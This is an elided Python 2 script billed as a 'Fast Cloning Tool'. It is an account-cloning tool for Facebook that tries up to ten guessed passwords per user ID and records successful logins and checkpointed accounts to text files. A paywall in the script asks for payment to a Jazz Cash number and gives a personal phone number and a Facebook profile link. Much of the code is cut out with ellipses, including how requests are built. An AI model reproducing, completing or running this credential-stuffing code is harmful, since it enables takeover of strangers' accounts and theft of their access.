...
import os, sys, time, datetime, re, threading, json, random, requests, hashlib, cookielib, subprocess,uuid,random,time,re,base64,concurrent.futures,json
from multiprocessing.pool import ThreadPool
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from requests.exceptions import ConnectionError
__author__ = 'rz'
__copyright = 'All rights reserved . Copyright  rz'
...
os.system('git pull')
os.system('clear')
logo = '\n\n   Coded By   : RoMEO  \n\xe2\x95\x91Fast Cloning Tool by   : ROMEO              \n\xe2\x95\x91 Speciali  Thnkx to   :  Rana MZ \n'
         
def reg():
    os.system('clear')
    print logo
    print ''
    print '\x1b[1;32;1m RoMeo'
    print ''
    time.sleep(1)
    try:
    ...
    if to in r:
        ...
        print ' \x1b[1;91m============================================= '
        print ' \x1b[1;92m SORY BRO TOOL iZ NOT FREE '
        print ' \x1b[1;91m============================================= '
        print ' \x1b[1;92m                    FOR APROVAL '
        print ' \x1b[1;91m============================================= '
        print ' \x1b[1;92m Send 250 To Oner Jazz Cash Acount  '
        print ' \x1b[1;92m NOTE :  For Aproval 1st Send Secren Shot Pement Proof'
        print ' \x1b[1;92mJazz Cash Number : 0308 9085973'
        print ' \x1b[1;92m Press enter to send Pement Proof  '
        print ' \x1b[1;91m============================================= ' 
        print ' \x1b[1;92mCopy the id and send to admin'
        print ' \x1b[1;92mYour id: ' + to
        raw_input('\x1b[1;93m Press enter to send id')
        os.system('xdg-open https://www.facebook.com/rajpoot.zada.7777')
        reg()
...
def log_menu():
    try:
        ...
        print 47 * '-'
        print '\x1b[1;92m[1] Log in with  FB ID '
...
def log_menu_s():
    s = raw_input('\x1b[1;97m\xe2\x95\xb0\xe2\x94\x80Hacker\xe2\x9e\xa4 ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
...
def a_s():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[iD iZ OK ] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/zee_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;92m[ iD iZ OK ] ' + uid + ' | ' + pass1
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[iD iZ OK ] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/zee_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;92m[ iD iZ OK ] ' + uid + ' | ' + pass2
                    cp = open('zee_cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[iD iZ OK ] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/zee_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;92m[ iD iZ OK ] ' + uid + ' | ' + pass3
                        cp = open('zee_cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[iD iZ OK ] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/zee_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;92m[ iD iZ OK ] ' + uid + ' | ' + pass4
                            cp = open('zee_cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[iD iZ OK ] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/zee_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;92m[ iD iZ OK ] ' + uid + ' | ' + pass5
                                cp = open('zee_cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                ...
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[iD iZ OK ] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/zee_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;92m[ iD iZ OK ] ' + uid + ' | ' + pass6
                                    cp = open('zee_cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m[iD iZ OK ] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('/sdcard/ids/zee_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;92m[ iD iZ OK ] ' + uid + ' | ' + pass7
                                        cp = open('zee_cp.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        ...
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m[iD iZ OK ] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('/sdcard/ids/zee_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;92m[ iD iZ OK ] ' + uid + ' | ' + pass8
                                            cp = open('zee_cp.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            ...
                                            q = json.loads(data)
                                            if 'loc' in q:
                                                print '\x1b[1;92m[iD iZ OK ] \x1b[1;32m' + uid + ' | ' + pass9 + '\x1b[0;97m'
                                                ok = open('/sdcard/ids/zee_OK.txt', 'a')
                                                ok.write(uid + ' | ' + pass9 + '\n')
                                                ok.close()
                                                oks.append(uid + pass9)
                                            elif 'www.facebook.com' in q['error']:
                                                print '\x1b[1;92m[ iD iZ OK ] ' + uid + ' | ' + pass9
                                                cp = open('zee_cp.txt', 'a')
                                                cp.write(uid + ' | ' + pass9 + '\n')
                                                cp.close()
                                                ...
                                                q = json.loads(data)
                                                if 'loc' in q:
                                                    print '\x1b[1;92m[iD iZ OK ] \x1b[1;32m' + uid + ' | ' + pass10 + '\x1b[0;97m'
                                                    ok = open('/sdcard/ids/zee_OK.txt', 'a')
                                                    ok.write(uid + ' | ' + pass10 + '\n')
                                                    ok.close()
                                                    oks.append(uid + pass10)
                                                elif 'www.facebook.com' in q['error']:
                                                    print '\x1b[1;92m[ iD iZ OK ] ' + uid + ' | ' + pass10
                                                    cp = open('zee_cp.txt', 'a')
                                                    cp.write(uid + ' | ' + pass10 + '\n')
                                                    cp.close()
